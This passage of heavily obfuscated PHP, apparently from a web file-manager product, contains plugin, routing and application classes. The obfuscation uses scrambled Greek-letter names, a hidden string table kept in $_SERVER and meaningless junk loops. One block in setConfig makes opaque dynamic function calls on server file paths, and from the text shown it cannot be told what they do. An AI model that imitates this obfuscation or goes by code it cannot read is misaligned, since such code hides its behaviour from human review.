$Δ¥ιΩφ, REPEAT_REPLACE); } IO::setContent($ ¶ΦπγΥ[$ΜόάΛ£±[87]], $Δ¥ιΩφ); return $ ¶ΦπγΥ[$ΜόάΛ£±[87]]; } final function pluginLocalFile($¤γΌ = '') { $ΆκΞΑΎ† =& $_SERVER[γγάψ½]; $‘Ρς¨“ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($‘Ρς¨“)) { mk_dir($‘Ρς¨“); } if (!$¤γΌ) { return $‘Ρς¨“; } $οΠΘΙ = IO::info($¤γΌ); $ηθ‘΄¥Έ = $ΆκΞΑΎ†[1675] . KodIO::hashPath($οΠΘΙ) . $ΆκΞΑΎ†[10] . $οΠΘΙ[$ΆκΞΑΎ†[169]]; if (!checkExtSafe($ηθ‘΄¥Έ)) { $ηθ‘΄¥Έ = $ηθ‘΄¥Έ . $ΆκΞΑΎ†[1302]; } $―¬οχω = $‘Ρς¨“ . $ηθ‘΄¥Έ; if (@file_exists($―¬οχω)) { return $―¬οχω; } return IO::copy($¤γΌ, $‘Ρς¨“, 0, $ηθ‘΄¥Έ); } final function appPackage() { $““ω =& $_SERVER[γγάψ½]; if ($this->packageData) { return $this->packageData; } $†άΈΛΘ = $this->parseFile($this->pluginPath . $““ω[1676]); $this->parseLang($†άΈΛΘ); $¤εν­€ = json_decode_force($†άΈΛΘ); if (!$¤εν­€) { return array(); } $…°Ηω¶• = Hook::trigger($““ω[1677], $¤εν­€); if ($…°Ηω¶• && is_array($…°Ηω¶•)) { $¤εν­€ = $…°Ηω¶•; } $this->packageData = $¤εν­€; return $¤εν­€; } public function packageInfoGet($»ίΆή‚Ω) { $ϊ¬’φµΞ = $this->appPackage(); return array_get_value($ϊ¬’φµΞ, $»ίΆή‚Ω); } public function packageVersion() { return $this->packageInfoGet($_SERVER[γγάψ½][1678]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[γγάψ½][1679]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[γγάψ½][1680]); } public function echoJsAssign($…™³γ°μ, $χ‰¦υ‡ε) { $this->echoJsAssignArr[$…™³γ°μ] = $χ‰¦υ‡ε; } private function parseFile($ό“›Ω‘) { $ΡέΏΗΙ =& $_SERVER[γγάψ½]; $θυΔ«¬γ = file_get_contents_nossl($ό“›Ω‘); $„» Εε¶ = array($ΡέΏΗΙ[1681], $ΡέΏΗΙ[1682], $ΡέΏΗΙ[1683], $ΡέΏΗΙ[1684], $ΡέΏΗΙ[1685], $ΡέΏΗΙ[1686], $ΡέΏΗΙ[1687]); $ΐΠ±Ρ™ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ΡέΏΗΙ[92]][$ΡέΏΗΙ[1688]]); foreach ($this->echoJsAssignArr as $―“Χχμ => $…Ά “Ίϋ) { $„» Εε¶[] = $ΡέΏΗΙ[1689] . $―“Χχμ . $ΡέΏΗΙ[1690]; $ΐΠ±Ρ™[] = is_array($…Ά “Ίϋ) || is_object($…Ά “Ίϋ) ? rawurlencode(json_encode($…Ά “Ίϋ)) : $…Ά “Ίϋ; } if (strstr($θυΔ«¬γ, $ΡέΏΗΙ[1691])) { $ωη­κ” = rawurlencode(json_encode($this->pluginLangArr)); $θυΔ«¬γ = str_replace($ΡέΏΗΙ[1691], $ωη­κ”, $θυΔ«¬γ); } if (strstr($θυΔ«¬γ, $ΡέΏΗΙ[1692])) { $ωη­κ” = $ωη­κ” = rawurlencode(json_encode($this->getConfig())); $θυΔ«¬γ = str_replace($ΡέΏΗΙ[1692], $ωη­κ”, $θυΔ«¬γ); } $θυΔ«¬γ = str_replace($„» Εε¶, $ΐΠ±Ρ™, $θυΔ«¬γ); return $θυΔ«¬γ; } private function parseLang(&$ΩΤα¬Ή) { $φ‰Ξ¤”– =& $_SERVER[γγάψ½]; $Έ¨δ¥–Ά = $φ‰Ξ¤”–[1693]; if (!strstr($ΩΤα¬Ή, $Έ¨δ¥–Ά)) { return; } preg_match_all($φ‰Ξ¤”–[1694], $ΩΤα¬Ή, $†εΨΊςΒ); if (!is_array($†εΨΊςΒ) || count($†εΨΊςΒ) == 0 || !is_array($†εΨΊςΒ[0]) || count($†εΨΊςΒ[0]) == 0) { return; } $¨όγ³Τ = array(); $‡ΆΊΫ΅ = array(); foreach ($†εΨΊςΒ[0] as $ως”„ετ) { $ψήζΔ¥ = substr($ως”„ετ, strlen($Έ¨δ¥–Ά), -4); $ΒΡα½£ = LNG($ψήζΔ¥); $¨όγ³Τ[] = $ως”„ετ; $‡ΆΊΫ΅[] = str_replace(array($φ‰Ξ¤”–[288], $φ‰Ξ¤”–[1165], $φ‰Ξ¤”–[420], $φ‰Ξ¤”–[121]), array($φ‰Ξ¤”–[53], $φ‰Ξ¤”–[53], $φ‰Ξ¤”–[12], $φ‰Ξ¤”–[1695]), $ΒΡα½£); } $ΩΤα¬Ή = str_replace($¨όγ³Τ, $‡ΆΊΫ΅, $ΩΤα¬Ή); } private function parseConfig(&$ΙρΡ„) { $δ°Ώ©ϊ =& $_SERVER[γγάψ½]; $ΙΙΜΆ· = $δ°Ώ©ϊ[1696]; if (!strstr($ΙρΡ„, $ΙΙΜΆ·)) { return; } preg_match_all($δ°Ώ©ϊ[1697], $ΙρΡ„, $ζΕ—Ή¤£); if (!is_array($ζΕ—Ή¤£) || count($ζΕ—Ή¤£) == 0 || !is_array($ζΕ—Ή¤£[0]) || count($ζΕ—Ή¤£[0]) == 0) { return; } $ύ™ρΚ = $this->getConfig(); $·‘α„κ‚ = array(); $ιή„– = array(); foreach ($ζΕ—Ή¤£[0] as $‹ΰέΔΩ) { $ΒΎέ…Λ = substr($‹ΰέΔΩ, strlen($ΙΙΜΆ·), -2); $·‘α„κ‚[] = $‹ΰέΔΩ; $ιή„–[] = _get($ύ™ρΚ, $ΒΎέ…Λ); } $ΙρΡ„ = str_replace($·‘α„κ‚, $ιή„–, $ΙρΡ„); } private function parsePackage(&$αβƒζ²Ξ) { $ΪΝί‚Εώ =& $_SERVER[γγάψ½]; $Ϋσ “ί¨ = $ΪΝί‚Εώ[1698]; if (!strstr($αβƒζ²Ξ, $Ϋσ “ί¨)) { return; } preg_match_all($ΪΝί‚Εώ[1699], $αβƒζ²Ξ, $χ¦•Π¥); if (!is_array($χ¦•Π¥) || count($χ¦•Π¥) == 0 || !is_array($χ¦•Π¥[0]) || count($χ¦•Π¥[0]) == 0) { return; } $µΖΎΠ = $this->appPackage(); $’ο­Ίβ = array(); $ΔΒσ±΄ = array(); foreach ($χ¦•Π¥[0] as $Ήμ‡―άύ) { $°‡ΰΌ Λ = substr($Ήμ‡―άύ, strlen($Ϋσ “ί¨), -2); $’ο­Ίβ[] = $Ήμ‡―άύ; $ΔΒσ±΄[] = _get($µΖΎΠ, $°‡ΰΌ Λ); } $αβƒζ²Ξ = str_replace($’ο­Ίβ, $ΔΒσ±΄, $αβƒζ²Ξ); } final function echoFile($‚ΫυόΈ—, $Υ’νεΠ = false) { $ρώηώ =& $_SERVER[γγάψ½]; $ΣγθƒΌ = $this->pluginPath . $‚ΫυόΈ—; if (ACT == $ρώηώ[1700]) { echo $ρώηώ[1701] . $this->pluginName . $ρώηώ[8] . $‚ΫυόΈ— . $ρώηώ[1702]; if (!file_exists($ΣγθƒΌ)) { echo $ρώηώ[1703]; return; } } $ΞέυΦφ = $this->parseFile($ΣγθƒΌ); $this->parseLang($ΞέυΦφ); $this->parseConfig($ΞέυΦφ); $this->parsePackage($ΞέυΦφ); if (is_array($Υ’νεΠ)) { $ΞέυΦφ = str_replace(array_keys($Υ’νεΠ), array_values($Υ’νεΠ), $ΞέυΦφ); } echo $ρώηώ[288] . $ΞέυΦφ; } private function checkVersion() { $¦τΑ³ΊΡ =& $_SERVER[γγάψ½]; $ά©Ήθ™ = $this->appPackage(); $Μΰ°ΧΔ = $this->getConfig(); if ($Μΰ°ΧΔ[$¦τΑ³ΊΡ[1704]] == $ά©Ήθ™[$¦τΑ³ΊΡ[1678]]) { return; } $this->regist(); $this->setConfig(array($¦τΑ³ΊΡ[1704] => $ά©Ήθ™[$¦τΑ³ΊΡ[1678]])); } final function initLang() { $Λ±ρΥ“θ =& $_SERVER[γγάψ½]; $µπ»¤Ω = $Λ±ρΥ“θ[1705]; $ΠΏΕ«τπ = $this->pluginPath . $Λ±ρΥ“θ[1706]; $Αψϊ—δ = I18n::getType(); $¬―Φ¦ = array(); if (file_exists($ΠΏΕ«τπ . $Αψϊ—δ . $Λ±ρΥ“θ[919])) { $¬―Φ¦ = (include $ΠΏΕ«τπ . $Αψϊ—δ . $Λ±ρΥ“θ[919]); } else { if ($Αψϊ—δ == $Λ±ρΥ“θ[1707] && !file_exists($ΠΏΕ«τπ . $Αψϊ—δ . $Λ±ρΥ“θ[919]) && file_exists($ΠΏΕ«τπ . $Λ±ρΥ“θ[1708])) { $¬―Φ¦ = (include $ΠΏΕ«τπ . $Λ±ρΥ“θ[1708]); } else { if (file_exists($ΠΏΕ«τπ . $µπ»¤Ω . $Λ±ρΥ“θ[919])) { $¬―Φ¦ = (include $ΠΏΕ«τπ . $µπ»¤Ω . $Λ±ρΥ“θ[919]); } } } if (!is_array($¬―Φ¦)) { return array(); } if (@count($¬―Φ¦) > 0) { I18n::set($¬―Φ¦); } return $¬―Φ¦; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ϋ•ΟΣ‘) { $ίτ¤ς =& $_SERVER[γγάψ½]; if ($_SERVER[$ίτ¤ς[961]] != $_SERVER[$ίτ¤ς[1709]]) { $Ϋ•ξι²΄ = $ίτ¤ς[962]; $άΗ–ϊ±Θ = $ίτ¤ς[963]; $έ¦‡Λ = $_SERVER[$ίτ¤ς[958]] . $ίτ¤ς[959]; $¥‘¤ΜΘΔ = $άΗ–ϊ±Θ($έ¦‡Λ); $αƒτ§χ = explode($ίτ¤ς[288], $¥‘¤ΜΘΔ); if (count($αƒτ§χ) < $ίτ¤ς[701]) { $ύΙΉ±» = $ίτ¤ς[964]; $ύΙΉ±»(); } $ ατηΟ = $ίτ¤ς[965]; $ ατηΟ($_SERVER[$ίτ¤ς[966]]); $ ατηΟ($_SERVER[$ίτ¤ς[958]] . $ίτ¤ς[1710]); $νΌΦ­δΏ = 1; while ($νΌΦ­δΏ > 1) { $νΌΦ­δΏ = $νΌΦ­δΏ + 4; $°Σ»ω‚ν = rawurlencode($νΌΦ­δΏ . $ίτ¤ς[457]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ϋ•ΟΣ‘); } public function onSetConfig($ΪΒΏ­Ε³) { } public function onGetConfig($ΑδΥό ν) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($γγά²) { if ($γγά² == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Ή™Χ¨Ϋν = "\160\154\x75\x67\151\x6e\101\x75\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ΰΟ‰Κ = $this->getConfig(); if (!$ΰΟ‰Κ[$Ή™Χ¨Ϋν]) { return !1; } return ActionCall($_SERVER[γγάψ½][1711], $ΰΟ‰Κ[$Ή™Χ¨Ϋν]); } public function url($†αχΦ, $ίρ“Γ… = '', $αψΧΥ³ = true) { $Ξ»τ€Οη =& $_SERVER[γγάψ½]; $Δ™’δ¦ = $this->getConfig(); $–Θα°ίύ = KOD_VERSION . $Ξ»τ€Οη[10] . KOD_VERSION_BUILD; $»­Μυμ = $this->packageVersion(); $ΌΠΔΊ† = $–Θα°ίύ . $Ξ»τ€Οη[465] . $»­Μυμ; if (substr($†αχΦ, 0, 4) == $Ξ»τ€Οη[152] || substr($†αχΦ, 0, 2) == $Ξ»τ€Οη[1429]) { $€£ερΌ = $†αχΦ . $Ξ»τ€Οη[1712] . $ΌΠΔΊ†; } else { if ($ίρ“Γ… == $Ξ»τ€Οη[12]) { $€£ερΌ = $this->pluginHost . $†αχΦ . $Ξ»τ€Οη[1712] . $ΌΠΔΊ†; } else { if ($ίρ“Γ… === $Ξ»τ€Οη[78]) { $€£ερΌ = $this->pluginHost . $†αχΦ; } else { if ($ίρ“Γ… == $Ξ»τ€Οη[1713]) { $€£ερΌ = STATIC_PATH . $†αχΦ . $Ξ»τ€Οη[1712] . $–Θα°ίύ; } else { if ($ίρ“Γ… == $Ξ»τ€Οη[1714]) { $€£ερΌ = APP_HOST . $Ξ»τ€Οη[1715] . $†αχΦ . $Ξ»τ€Οη[1712] . $–Θα°ίύ; } else { if (isset($Δ™’δ¦[$ίρ“Γ…])) { $€£ερΌ = $Δ™’δ¦[$ίρ“Γ…] . $†αχΦ . $Ξ»τ€Οη[1712] . $ΌΠΔΊ†; } } } } } } if (!$αψΧΥ³) { return $€£ερΌ; } echo $€£ερΌ; } public function link($®ιωΩεο = false, $Ρ΅Νέ¥½ = '') { $υΆΕΆ« =& $_SERVER[γγάψ½]; $γαΞΖ = $this->linkHas == !1; $this->linkHas = !0; if (!$®ιωΩεο) { $this->link($υΆΕΆ«[1716], $υΆΕΆ«[1714]); $this->link($υΆΕΆ«[1717], $υΆΕΆ«[1713]); $this->link($υΆΕΆ«[1718], $υΆΕΆ«[1713]); $this->link($υΆΕΆ«[1719], $υΆΕΆ«[1713]); $this->link($υΆΕΆ«[1720], $υΆΕΆ«[1713]); if ($γαΞΖ) { Hook::trigger($υΆΕΆ«[1721]); } return; } $ΑιΤ°¶δ = $this->url($®ιωΩεο, $Ρ΅Νέ¥½, !1); if (substr($®ιωΩεο, -3) == $υΆΕΆ«[1722]) { echo $υΆΕΆ«[1723] . $ΑιΤ°¶δ . $υΆΕΆ«[1724] . $υΆΕΆ«[288]; } else { if (substr($®ιωΩεο, -4) == $υΆΕΆ«[1725]) { echo $υΆΕΆ«[1726] . $ΑιΤ°¶δ . $υΆΕΆ«[1727] . $υΆΕΆ«[288]; } } if ($γαΞΖ) { Hook::trigger($υΆΕΆ«[1721]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\133\136\x2f\135\53", "\x3a\x6e\x75\x6d" => "\133\x30\x2d\71\135\x2b", "\72\141\154\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($ΑΩθ‰—Ι, $…›μ·) { $½Ρέάϊ¤ =& $_SERVER[γγάψ½]; if ($ΑΩθ‰—Ι == $½Ρέάϊ¤[1728]) { $ρ Έ = array_map($½Ρέάϊ¤[1729], $…›μ·[0]); $•ΜΔΟί = strpos($…›μ·[1], $½Ρέάϊ¤[8]) === 0 ? $…›μ·[1] : $½Ρέάϊ¤[8] . $…›μ·[1]; $Φ­† τΖ = $…›μ·[2]; } else { $ρ Έ = null; $•ΜΔΟί = strpos($…›μ·[0], $½Ρέάϊ¤[8]) === 0 ? $…›μ·[0] : $½Ρέάϊ¤[8] . $…›μ·[0]; $Φ­† τΖ = $…›μ·[1]; } array_push(self::$maps, $ρ Έ); array_push(self::$routes, $•ΜΔΟί); array_push(self::$methods, strtoupper($ΑΩθ‰—Ι)); array_push(self::$callbacks, $Φ­† τΖ); } public static function error($®΄±ψΒ) { self::$errorCallback = $®΄±ψΒ; } public static function haltOnMatch($όΓιΗ = true) { self::$halts = $όΓιΗ; } public static function dispatch() { $ύβΞ™τβ =& $_SERVER[γγάψ½]; $Τ—¬Ν™ = parse_url($_SERVER[$ύβΞ™τβ[1730]], PHP_URL_PATH); $ϋΘ¦£ = $_SERVER[$ύβΞ™τβ[164]]; $ΟΖ¶  = array_keys(static::$patterns); $οοκ¤Ύ = array_values(static::$patterns); $μΑγ²Ήθ = !1; self::$routes = preg_replace($ύβΞ™τβ[1372], $ύβΞ™τβ[8], self::$routes); if (in_array($Τ—¬Ν™, self::$routes)) { $ήΦ‰ν‘ = array_keys(self::$routes, $Τ—¬Ν™); foreach ($ήΦ‰ν‘ as $°) { if (self::$methods[$°] == $ϋΘ¦£ || self::$methods[$°] == $ύβΞ™τβ[1731] || in_array($ϋΘ¦£, self::$maps[$°])) { $μΑγ²Ήθ = !0; if (!is_object(self::$callbacks[$°])) { $Γ¬ΠΞίϋ = explode($ύβΞ™τβ[8], self::$callbacks[$°]); $τοΛ„ξ = end($Γ¬ΠΞίϋ); $χ‘ώΒ§‚ = explode($ύβΞ™τβ[1304], $τοΛ„ξ); $¥αλ·Λ = new $χ‘ώΒ§‚[0](); $¥αλ·Λ->{$χ‘ώΒ§‚[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$°]); if (self::$halts) { return; } } } } } else { $ƒ›ι’ = 0; foreach (self::$routes as $°) { if (strpos($°, $ύβΞ™τβ[4]) !== !1) { $° = str_replace($ΟΖ¶ , $οοκ¤Ύ, $°); } if (preg_match($ύβΞ™τβ[1732] . $° . $ύβΞ™τβ[1733], $Τ—¬Ν™, $ώΜΉ«‹)) { if (self::$methods[$ƒ›ι’] == $ϋΘ¦£ || self::$methods[$ƒ›ι’] == $ύβΞ™τβ[1731] || !empty(self::$maps[$ƒ›ι’]) && in_array($ϋΘ¦£, self::$maps[$ƒ›ι’])) { $μΑγ²Ήθ = !0; array_shift($ώΜΉ«‹); if (!is_object(self::$callbacks[$ƒ›ι’])) { $Γ¬ΠΞίϋ = explode($ύβΞ™τβ[8], self::$callbacks[$ƒ›ι’]); $τοΛ„ξ = end($Γ¬ΠΞίϋ); $χ‘ώΒ§‚ = explode($ύβΞ™τβ[1304], $τοΛ„ξ); $¥αλ·Λ = new $χ‘ώΒ§‚[0](); if (!method_exists($¥αλ·Λ, $χ‘ώΒ§‚[1])) { echo $ύβΞ™τβ[1734]; } else { call_user_func_array(array($¥αλ·Λ, $χ‘ώΒ§‚[1]), $ώΜΉ«‹); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ƒ›ι’], $ώΜΉ«‹); if (self::$halts) { return; } } } } $ƒ›ι’++; } } if ($μΑγ²Ήθ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $°••¨ή =& $_SERVER[γγάψ½]; header($_SERVER[$°••¨ή[1735]] . $°••¨ή[1736]); echo $°••¨ή[1737]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ύβΞ™τβ[1730]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto f„α„™©; b…»‚ςΌ‹¶: class Application { private $defaultModule = "\x69\156\x64\x65\x78"; private $defaultController = "\151\156\x64\x65\x78"; private $defaultAction = "\x69\x6e\144\x65\170"; function __construct() { } public function setDefault($ζΞΏΓ“Ό) { $ΥεΎμΥγ =& $_SERVER[γγάψ½]; $ΎυΙ– =& $_SERVER[Βφεβ–φ]; $μνΎΞ = explode($ΎυΙ–[0], trim($ζΞΏΓ“Ό, $ΎυΙ–[0])); $this->defaultModule = $μνΎΞ[0] ? $μνΎΞ[0] : $this->defaultModule; $–ην®« = $ΥεΎμΥγ[692]; $this->defaultController = $μνΎΞ[1] ? $μνΎΞ[1] : $this->defaultController; $this->defaultAction = $μνΎΞ[2] ? $μνΎΞ[2] : $this->defaultAction; $Ά·©† = $ΥεΎμΥγ[693]; while ($Ά·©† < $ΥεΎμΥγ[694]) { if ($Ά·©† >= 0) { break; } $Ά·©†++; } $this->optz94306435($ΎυΙ–[1], array($this, $ΎυΙ–[2])); } public function appRun($ΉΒϊμ) { $΄ρμϋ =& $_SERVER[γγάψ½]; $ΝτΣη§― =& $_SERVER[Βφεβ–φ]; $»΄®―ί = explode($ΝτΣη§―[0], $ΉΒϊμ); $³±ΩΫ  = $΄ρμϋ[695]; $Π΄ΐ±Δύ = strtolower($»΄®―ί[0]); $‹®Ή–θ = $΄ρμϋ[696]; $£ϋΛ†σ = $ΝτΣη§―[3]; if ($Π΄ΐ±Δύ == $ΝτΣη§―[4]) { $£ϋΛ†σ = $ΝτΣη§―[5]; $»΄®―ί[0] = $ΝτΣη§―[6]; $»΄®―ί[1] = $»΄®―ί[1] . $ΝτΣη§―[7]; $ΉΒϊμ = join($ΝτΣη§―[0], $»΄®―ί); $ΉΒϊμ = trim($ΉΒϊμ, $ΝτΣη§―[0]); } call_user_func(array($ΝτΣη§―[8], $ΝτΣη§―[9]), $£ϋΛ†σ . $ΝτΣη§―[10], $ΉΒϊμ); ActionCall($ΉΒϊμ); $ΰ€£Γ¶Ϋ = $΄ρμϋ[697]; while (strlen($ΰ€£Γ¶Ϋ) < $΄ρμϋ[698]) { if (!$ΰ€£Γ¶Ϋ) { break; } $ΰ€£Γ¶Ϋ++; } call_user_func(array($ΝτΣη§―[8], $ΝτΣη§―[9]), $£ϋΛ†σ . $ΝτΣη§―[11], $ΉΒϊμ); } private function autorun() { $υΕ…ώ =& $_SERVER[γγάψ½]; $•ΟΜΟπ† =& $_SERVER[Βφεβ–φ]; global $config; $“ώΫι™ = $υΕ…ώ[699]; if (strlen($“ώΫι™) < $υΕ…ώ[691]) { return; } if (count($config[$•ΟΜΟπ†[12]]) == 0) { return; } foreach ($config[$•ΟΜΟπ†[12]] as $ΩυΌ΄‡Β => $±Ι) { $this->appRun($±Ι); } } private function uiwq0e1d7abb() { $•ό£΅ΓΎ =& $_SERVER[γγάψ½]; $”‹›Ή =& $_SERVER[Βφεβ–φ]; $ο­ΔΥςΆ = $”‹›Ή[4]; $ξάηΰ“ = $GLOBALS[$”‹›Ή[13]][$”‹›Ή[14]][0]; if (!$ξάηΰ“ || strlen($ξάηΰ“) <= strlen($ο­ΔΥςΆ)) { return; } if (strtolower(substr($ξάηΰ“, -strlen($ο­ΔΥςΆ))) != $ο­ΔΥςΆ) { return; } $ψ΄¥ΰΧ‰ = substr($ξάηΰ“, 0, -strlen($ο­ΔΥςΆ)); $χ—–™ϊ = $•ό£΅ΓΎ[700]; while ($χ—–™ϊ < $•ό£΅ΓΎ[701]) { if ($χ—–™ϊ >= 0) { break; } $χ—–™ϊ++; } $’ξέΗ® = array($”‹›Ή[4], $ψ΄¥ΰΧ‰); $’‹ηΙ = array_slice($GLOBALS[$”‹›Ή[13]][$”‹›Ή[14]], 1); $GLOBALS[$”‹›Ή[13]][$”‹›Ή[14]] = array_merge($’ξέΗ®, $’‹ηΙ); $Ε±Ύό― = $•ό£΅ΓΎ[702]; if (strlen($Ε±Ύό―) < $•ό£΅ΓΎ[694]) { return; } $GLOBALS[$”‹›Ή[13]][$”‹›Ή[15]] = implode($”‹›Ή[0], $GLOBALS[$”‹›Ή[13]][$”‹›Ή[14]]); $Ί΄ΰ±ς = $•ό£΅ΓΎ[703]; if (!$Ί΄ΰ±ς) { die; } } private function iubma637e01c() { $άΎΚη =& $_SERVER[γγάψ½]; $Α‹­Χ‚ =& $_SERVER[Βφεβ–φ]; if ($GLOBALS[$Α‹­Χ‚[13]][$Α‹­Χ‚[15]] != $Α‹­Χ‚[6]) { return; } $—Ι΅Θ = $_SERVER[$Α‹­Χ‚[16]]; $ς”‘Έρ = $Α‹­Χ‚[17]; if (!strstr($—Ι΅Θ, $ς”‘Έρ)) { return; } $Υ‘Ρ¬ = strrpos($—Ι΅Θ, $ς”‘Έρ); $§‡Ιι = substr($—Ι΅Θ, $Υ‘Ρ¬ + strlen($ς”‘Έρ)); $νθοήΒ = $άΎΚη[704]; preg_match_all($Α‹­Χ‚[18], $§‡Ιι, $­Ξ‚²³™); $§‡Ιι = trim($­Ξ‚²³™[0][0], $Α‹­Χ‚[19]); $GLOBALS[$Α‹­Χ‚[13]][$Α‹­Χ‚[14]] = explode($Α‹­Χ‚[19], $§‡Ιι); $GLOBALS[$Α‹­Χ‚[13]][$Α‹­Χ‚[15]] = implode($Α‹­Χ‚[0], $GLOBALS[$Α‹­Χ‚[13]][$Α‹­Χ‚[14]]); $ζΜ―¥γΘ = $άΎΚη[705]; while (strlen($ζΜ―¥γΘ) < $άΎΚη[706]) { if (!$ζΜ―¥γΘ) { break; } $ζΜ―¥γΘ++; } } public function run() { $ύζΈω‹½ =& $_SERVER[γγάψ½]; $χΧΩΣ™φ =& $_SERVER[Βφεβ–φ]; $this->iubma637e01c(); $ µπαξ = $ύζΈω‹½[707]; if (!$ µπαξ) { return; } $this->uiwq0e1d7abb(); $Ράά·Υ‹ = $GLOBALS[$χΧΩΣ™φ[13]][$χΧΩΣ™φ[14]]; $ΛϊΥ·ΐΘ = $GLOBALS[$χΧΩΣ™φ[13]][$χΧΩΣ™φ[15]]; define($χΧΩΣ™φ[20], isset($Ράά·Υ‹[0]) && $Ράά·Υ‹[0] ? $Ράά·Υ‹[0] : $this->defaultModule); define($χΧΩΣ™φ[21], isset($Ράά·Υ‹[1]) && $Ράά·Υ‹[0] ? $Ράά·Υ‹[1] : $this->defaultController); define($χΧΩΣ™φ[22], isset($Ράά·Υ‹[2]) && $Ράά·Υ‹[0] ? $Ράά·Υ‹[2] : $this->defaultAction); $³¥ΰ™Ο = $ύζΈω‹½[708]; while ($³¥ΰ™Ο < $ύζΈω‹½[694]) { if ($³¥ΰ™Ο >= 0) { break; } $³¥ΰ™Ο++; } define($χΧΩΣ™φ[23], MOD . $χΧΩΣ™φ[0] . ST . $χΧΩΣ™φ[0] . ACT); $σ€Ο°Λ = $ύζΈω‹½[709]; if (strlen($σ€Ο°Λ) < $ύζΈω‹½[694]) { return; } $_SERVER[$χΧΩΣ™φ[24]] = strtolower(ACTION); $this->autorun(); $ψΌ”Τ©„ = $ύζΈω‹½[710]; if (strlen($ψΌ”Τ©„) < $ύζΈω‹½[701]) { die; } if (count($Ράά·Υ‹) >= 3) { $this->appRun($ΛϊΥ·ΐΘ); } else { $this->appRun(ACTION); } } private $tdox5a24fe65 = array(); private $lqsn9f2dccec = ''; public function wairf8b249b4() { $Μά·γΥ =& $_SERVER[γγάψ½]; $υ¤€¦θ =& $_SERVER[Βφεβ–φ]; $this->hzdfce0889a3(); $“χ‹Ε = $Μά·γΥ[711]; $this->tunfd84a992e(); $»•Χο = $Μά·γΥ[712]; if (strlen($»•Χο) < $Μά·γΥ[691]) { die; } $this->uczjdbd7d787(); $this->veic7d9ed4da(); $£Ό£ΥΌΫ = $Μά·γΥ[713]; while (strlen($£Ό£ΥΌΫ) < $Μά·γΥ[694]) { if (!$£Ό£ΥΌΫ) { break; } $£Ό£ΥΌΫ++; } $this->nkaffdaf229e(); $this->pmrkfff640d4(); $ΰΐ•¶‰ƒ = $Μά·γΥ[714]; $this->hwbmdf05441b(); $this->optz94306435($υ¤€¦θ[25], array($this, $υ¤€¦θ[26])); $this->optz94306435($υ¤€¦θ[27], array($this, $υ¤€¦θ[28])); $this->optz94306435($υ¤€¦θ[29], array($this, $υ¤€¦θ[30])); $ΖΞά¦— = $Μά·γΥ[715]; if (!$ΖΞά¦—) { return; } $this->optz94306435($υ¤€¦θ[31], array($this, $υ¤€¦θ[32])); $ΛΎΕΥΒΩ = $Μά·γΥ[716]; while ($ΛΎΕΥΒΩ < $Μά·γΥ[706]) { if ($ΛΎΕΥΒΩ >= 0) { break; } $ΛΎΕΥΒΩ++; } } public function rzjb591c5ebb($ή―ΐ„‚π) { $ςνΏμσ =& $_SERVER[γγάψ½]; $ΦμΒ­Ζύ =& $_SERVER[Βφεβ–φ]; $ΦπήςΑ = Model($ΦμΒ­Ζύ[33])->get(); $—Ό³— = array($ΦμΒ­Ζύ[34], $ΦμΒ­Ζύ[35], $ΦμΒ­Ζύ[36], $ΦμΒ­Ζύ[37], $ΦμΒ­Ζύ[38], $ΦμΒ­Ζύ[39], $ΦμΒ­Ζύ[40], $ΦμΒ­Ζύ[41], $ΦμΒ­Ζύ[42], $ΦμΒ­Ζύ[43], $ΦμΒ­Ζύ[44], $ΦμΒ­Ζύ[45], $ΦμΒ­Ζύ[46], $ΦμΒ­Ζύ[47], $ΦμΒ­Ζύ[48], $ΦμΒ­Ζύ[49], $ΦμΒ­Ζύ[50], $ΦμΒ­Ζύ[51], $ΦμΒ­Ζύ[52], $ΦμΒ­Ζύ[53], $ΦμΒ­Ζύ[54], $ΦμΒ­Ζύ[55], $ΦμΒ­Ζύ[56], $ΦμΒ­Ζύ[57], $ΦμΒ­Ζύ[58], $ΦμΒ­Ζύ[59], $ΦμΒ­Ζύ[60], $ΦμΒ­Ζύ[61], $ΦμΒ­Ζύ[62], $ΦμΒ­Ζύ[63], $ΦμΒ­Ζύ[64], $ΦμΒ­Ζύ[65], $ΦμΒ­Ζύ[66], $ΦμΒ­Ζύ[67], $ΦμΒ­Ζύ[68], $ΦμΒ­Ζύ[69], $ΦμΒ­Ζύ[70], $ΦμΒ­Ζύ[71], $ΦμΒ­Ζύ[72], $ΦμΒ­Ζύ[73], $ΦμΒ­Ζύ[74], $ΦμΒ­Ζύ[75], $ΦμΒ­Ζύ[76], $ΦμΒ­Ζύ[77], $ΦμΒ­Ζύ[78], $ΦμΒ­Ζύ[79], $ΦμΒ­Ζύ[80], $ΦμΒ­Ζύ[81], $ΦμΒ­Ζύ[82], $ΦμΒ­Ζύ[83], $ΦμΒ­Ζύ[84], $ΦμΒ­Ζύ[85]); foreach ($—Ό³— as $υύ§„¤) { $–®Γγµ = $GLOBALS[$ΦμΒ­Ζύ[86]][$ΦμΒ­Ζύ[87]][$υύ§„¤]; if (isset($ΦπήςΑ[$υύ§„¤])) { $–®Γγµ = $ΦπήςΑ[$υύ§„¤]; } $ή―ΐ„‚π[$ΦμΒ­Ζύ[88]][$ΦμΒ­Ζύ[89]][$υύ§„¤] = $–®Γγµ; } $§Ύ€πΤΰ = $ή―ΐ„‚π[$ΦμΒ­Ζύ[88]][$ΦμΒ­Ζύ[89]][$ΦμΒ­Ζύ[46]]; 